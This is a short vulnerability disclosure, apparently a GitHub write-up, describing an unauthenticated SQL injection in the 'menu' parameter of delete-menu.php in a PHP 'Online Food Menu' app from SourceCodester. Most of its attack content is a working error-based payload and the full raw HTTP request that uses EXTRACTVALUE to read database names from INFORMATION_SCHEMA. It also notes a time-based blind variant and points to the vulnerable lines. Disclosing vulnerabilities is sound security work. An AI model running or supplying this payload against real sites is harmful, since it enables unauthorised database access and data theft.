# Food Menu CMS - SQL injection vulnerability

### You do not need to log in to the website to remotely trigger SQL injection vulnerabilities!

Supplier:https://www.sourcecodester.com/php/17096/online-food-menu-using-php-and-mysql-source-code.html

http://localhost/endpoint/delete-menu.php?menu=1   -----> 'menu' can control some menu parameters

Payload:?menu=1' AND EXTRACTVALUE(1,CONCAT(0x5c,0x01,(SELECT MID((IFNULL(CAST(schema_name AS NCHAR),0x20)),1,21) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 3,1),0x00)) AND '1'='1

```r
GET /endpoint/delete-menu.php?menu=1'+AND+EXTRACTVALUE(1,CONCAT(0x5c,0x01,(SELECT+MID((IFNULL(CAST(schema_name+AS+NCHAR),0x20)),1,21)+FROM+INFORMATION_SCHEMA.SCHEMATA+LIMIT+3,1),0x00))+AND+'1'%3d'1 HTTP/1.1
Host: xxxxxxxx
```

![1](/img/1.png)

Running this payload will reveal the name of the database. This indicates that SQL injection vulnerability has been successfully executed in the database, allowing for database querying. Apart from error-based injection, there also exists time-based blind injection vulnerabilities.

![2](/img/2.png)

The parameter "menu" received on line 5 of the delete-menu.php file in the "endpoint" directory of the website is vulnerable to being controlled by guest users, and then it is executed on line 12, causing a SQL injection vulnerability.

![3](/img/3.png)
